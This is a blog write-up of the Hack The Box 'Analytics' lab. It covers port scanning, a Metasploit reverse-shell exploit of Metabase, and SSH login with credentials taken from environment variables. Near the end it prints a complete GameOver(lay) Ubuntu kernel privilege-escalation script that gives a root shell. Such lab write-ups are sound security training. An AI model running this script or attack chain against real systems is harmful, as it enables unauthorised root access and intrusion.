---
layout: post
title: "Analytics - Hack the box - Write up"
date: 2023-11-08
categories: HTB
author: "Harsimran Sidhu"
---

# Hack The Box Write-Up: Analytics
In this post, I'm going to walk through my process of tackling the "Analytics" box on Hack The Box. I'll detail the steps taken, from initial reconnaissance to gaining access and eventual system exploitation.

## Initial Reconnaissance
First things first, I needed to make sure the box was reachable over the network. A simple `ping` command sufficed:
![image](https://github.com/PKHarsimran/PKHarsimran.github.io/assets/22066581/9b792bfb-9bec-4fa6-8c8f-d58a2dc1b81e)

## Task 2: Port Scanning
After establishing the availability of the "Analytics" box, I proceeded with a comprehensive port scan using nmap. The goal was to identify open ports and running services that could provide vectors for deeper analysis or exploitation.

Here's the nmap command I used:

```bash
sudo nmap -p- --open -sS --min-rate 5000 -Pn -n -v 10.10.11.233 -oN nmap
```
![image](https://github.com/PKHarsimran/PKHarsimran.github.io/assets/22066581/e4789716-e3a5-4f82-a8c8-613bd64b3d08)

This command initiated an intensive SYN Stealth Scan, bypassing ping discovery (which can be useful if the host is blocking ping requests), not resolving DNS to speed up the scan, and running it verbosely to get real-time feedback. The --min-rate 5000 flag was used to send packets at a higher rate, significantly speeding up the scan process. The results were saved to a file named nmap.

- Port 22/tcp: An open port for SSH, which indicates that we might be able to connect to the box via secure shell. It's also a potential avenue for exploitation if there are vulnerabilities in the SSH service or weak credentials in use.
- Port 80/tcp: An open HTTP port suggesting a web server is running. This could be the main entry point for web-based exploitation, such as finding vulnerabilities in web applications or misconfigurations.

## Task 3: Service Enumeration
With the open ports identified, I proceeded with a service version detection scan on ports 22 and 80 using nmap. This type of scan is used to determine the versions of the services running on the open ports and to execute default scripts for further enumeration.

The command executed was:

```bash
sudo nmap -p22,80 -sCV -v 10.10.11.233 -oN nmapsV
```
![image](https://github.com/PKHarsimran/PKHarsimran.github.io/assets/22066581/b1cca498-6abd-43ea-a6f3-92994aa4ae59)

This command targets the specific open ports (22 and 80), requests service versions (-sV), runs default NSE scripts for more information (-sC), and increases verbosity for detailed output (-v). The results were saved to a file nmapsV.

- SSH on port 22: The service running is OpenSSH version 8.9p1 Ubuntu 3ubuntu0.4. This is a recent version, and unless configured with weak credentials or keys, it might not be the easiest vector for exploitation.

- HTTP on port 80: The service identified is nginx version 1.18.0 hosted on Ubuntu. The HTTP methods supported include GET, HEAD, POST, and OPTIONS. Notably, there's a redirect to http://analytical.htb/, which could be an internal domain for the web service.

## Task 4: Host Mapping
To facilitate easier access to the services running on 10.10.11.233, especially the web service identified during the enumeration phase, I mapped the hostname analytical.htb to the box's IP address in my local /etc/hosts file.

The command used for this mapping was:

```bash
echo '10.10.11.233 analytical.htb' | sudo tee -a /etc/hosts
```
![image](https://github.com/PKHarsimran/PKHarsimran.github.io/assets/22066581/09802b9d-8ff1-4010-8e2d-a436b3f215b2)

This appends the custom hostname to the end of the hosts file and now any traffic directed to analytical.htb will route to 10.10.11.233. This step is crucial for testing web applications that rely on specific host headers or virtual hosting environments.

## Task 5: Web Content Analysis
With the hostname analytical.htb now resolvable to the target IP, I proceeded to analyze the web content using the whatweb tool. This tool is useful for uncovering technologies, email addresses, and other information embedded within the web application.

The command executed was:
```bash
sudo whatweb http://analytical.htb/
```
![image](https://github.com/PKHarsimran/PKHarsimran.github.io/assets/22066581/0e0bbe74-f24a-4ed7-89d7-ccd75c9fe894)

The whatweb scan returned the following information about the web application:

- Server: Running on Ubuntu Linux with nginx/1.18.0.
- Technologies: Uses Bootstrap, HTML5, and jQuery version 3.0.0.
- Email Addresses: Identified two email addresses (demo@analytical.com, due@analytical.com).
- Miscellaneous: The page includes frames, scripts, and is HTML5 compliant with a title of "Analytical". It also specifies compatibility with Internet Explorer using the X-UA-Compatible header.

This reconnaissance provides a clearer picture of the web application's stack and potential areas for further investigation, such as outdated jQuery libraries or server configurations that may present vulnerabilities.

## Task 6: Subdomain Routing
During the process, I discovered a redirection to a subdomain: http://data.analytical.htb/. To ensure proper resolution, I added both the main domain and the subdomain to the /etc/hosts file, associating them with the box's IP address.

The command used to update the host mapping was:
```bash
echo '10.10.11.233 analytical.htb data.analytical.htb' | sudo tee -a /etc/hosts
```
![image](https://github.com/PKHarsimran/PKHarsimran.github.io/assets/22066581/71b249ef-4365-4975-ad55-d85c30e1f09e)

With this update, any requests to analytical.htb or data.analytical.htb will be directed to 10.10.11.233, allowing the site to load correctly and facilitating further investigation into the application hosted on the subdomain.

## Task 8: Successful Exploitation with Metasploit
After the initial manual exploitation attempt failed, I turned to Metasploit, a widely-used penetration testing framework that offers a suite of tools to test system vulnerabilities.
I started by searching for relevant Metabase exploits within Metasploit:

```bash
search metabase
```
![image](https://github.com/PKHarsimran/PKHarsimran.github.io/assets/22066581/c71e7a78-5fa5-4fe7-8baa-06f2eeca66ad)

The search yielded an exploit module for a Metabase Setup Token Remote Code Execution vulnerability, which was disclosed on 2023-07-22. The module's rank was listed as 'excellent', indicating a high level of reliability and success rate.
Using this information, I executed the following commands to set up the exploit:

![image](https://github.com/PKHarsimran/PKHarsimran.github.io/assets/22066581/13502e41-5c1c-4c6b-8f1e-ab8a0f5d6683)

The Metasploit module targeted the Metabase application at data.analytical.htb on port 80, with a reverse shell payload set to connect back to my listener at 10.10.14.227 on port 4444.
The exploit confirmed the target's vulnerability and successfully obtained a session:

![image](https://github.com/PKHarsimran/PKHarsimran.github.io/assets/22066581/8c3e3163-7a87-4de7-8531-5d1849d2482d)

This successful exploitation resulted in a command shell session being opened, providing access to the target system. With this access, I can now execute commands directly on the compromised host, allowing for further enumeration and potential privilege escalation.

## Task 9: Credential Discovery and SSH Access
During my exploration of the system via the Metasploit session, I executed the env command to review the environment variables. This is a common practice to uncover potential credentials or other sensitive information that may be stored in the environment.

The command and a snippet of its output are as follows:
```bash
env
```

Among the various entries, two variables stood out:

- META_USER: A username for what seemed to be a system account.
- META_PASS: A password that accompanied the username.

![image](https://github.com/PKHarsimran/PKHarsimran.github.io/assets/22066581/69b825d4-2ea1-468e-a812-b780d248dbd4)

With these credentials in hand, I proceeded to attempt SSH access to the host. Using the META_USER and META_PASS, I was able to successfully authenticate over SSH, gaining a more stable and reliable connection to the target system.

![image](https://github.com/PKHarsimran/PKHarsimran.github.io/assets/22066581/4b027c91-f436-4624-b3a3-b0f58430574a)

This sequence of events—from discovering sensitive environment variables to leveraging them for SSH access and finally locating the user flag—demonstrates a successful user-level compromise of the target system.

## Task 10: Privilege Escalation and Root Flag Acquisition
After stabilizing my SSH foothold as metalytics, I executed the uname -a command to determine the system's kernel version:
```bash
uname -a
```

```bash
metalytics@analytics:~$ uname -a
Linux analytics 6.2.0-25-generic #25~22.04.2-Ubuntu SMP PREEMPT_DYNAMIC Wed Jun 28 09:55:23 UTC 2 x86_64 x86_64 x86_64 GNU/Linux
```
The output revealed a kernel version potentially vulnerable to recent exploits [(CVE-2023-2640 and CVE-2023-32629)](https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629). Armed with this knowledge, I crafted a exploit.sh script in the /tmp directory to exploit these vulnerabilities:
```bash
#!/bin/bash

# CVE-2023-2640 CVE-2023-3262: GameOver(lay) Ubuntu Privilege Escalation
# by g1vi https://github.com/g1vi
# October 2023

echo "[+] You should be root now"
echo "[+] Type 'exit' to finish and leave the house cleaned"

unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("cp /bin/bash /var/tmp/bash && chmod 4755 /var/tmp/bash && /var/tmp/bash -p && rm -rf l m u w /var/tmp/bash")'
```
Running this script successfully exploited the kernel vulnerabilities, granting me root privileges. I then navigated to the root user's home directory and listed its contents, where I found the root.txt file:

![image](https://github.com/PKHarsimran/PKHarsimran.github.io/assets/22066581/d93be8ff-0895-4091-8b76-c30468b9d97d)

This confirmed my root access, as shown in the uploaded screenshot, where the presence of root.txt in the /root directory signifies successful privilege escalation.

Finally, I was able to read the contents of root.txt and capture the root flag, marking the culmination of this CTF challenge.

![image](https://github.com/PKHarsimran/PKHarsimran.github.io/assets/22066581/062aceab-360d-4b71-acaf-ec2a6e7451e8)




